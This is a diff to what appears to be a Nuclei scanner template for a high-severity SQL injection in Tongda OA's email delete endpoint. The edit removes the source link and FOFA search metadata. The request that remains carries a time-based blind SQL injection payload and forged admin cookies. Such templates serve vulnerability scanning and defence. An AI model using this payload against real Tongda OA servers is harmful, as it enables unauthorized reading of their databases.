@@ -3,12 +3,8 @@ info:
   name: 通达OA SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ce3gh2fkaw92ng50'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ce3gh2fkaw92ng50
-    fofa: app.name="通达 OA"
 http:
 - raw:
   - 'POST /pda/pad/email/delete.php HTTP/1.1
@@ -33,8 +29,6 @@ http:
 
 
     Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=djdn42kbghtfftdtfdcnf663o4; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=6eb35161
-
-
 
 
     EMAIL_ID=1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1&A=delbox
